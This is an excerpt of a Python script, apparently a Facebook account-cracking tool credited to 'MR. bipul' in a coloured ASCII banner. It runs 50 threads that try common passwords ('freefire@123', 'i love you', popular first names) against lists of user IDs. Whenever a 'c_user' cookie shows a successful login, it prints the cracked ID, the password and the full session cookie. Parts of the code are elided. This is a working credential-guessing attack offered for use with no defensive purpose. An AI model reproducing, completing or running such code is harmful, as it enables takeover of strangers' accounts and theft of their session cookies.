...
║   \033[0;92m ╚═╝\033[0;91m     ╚═════╝\033[0;94m     ╚═╝\033[0;93m     ╚═════╝\033[0;95m   ╚══════╝ ║
\033[0;94m╠═══════════════════════════════════════════════════║
\033[0;93m╠══[Author:=======================> \33[1;38mMR. bipul\33[1;38m       ║\033[1;31m
╠══[Facebook:=====================> bipul King      ║  \033[1;97m
╠══[Github:=======================> \33[1;38mbipul-King      ║\33[1;34m
...
def xxr():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        jalan('\033[1;97m====================================================')
            ...
            pwx = [uid,'freefire@123','freefire@321','free fire','free fire123','free fire@123','free fire321',' free fire@321','free fire123','i love you','jannat','tamanna','sadiya','shopna','nusrat']
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
                pwx.append(love)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[bipul-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}bipul{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
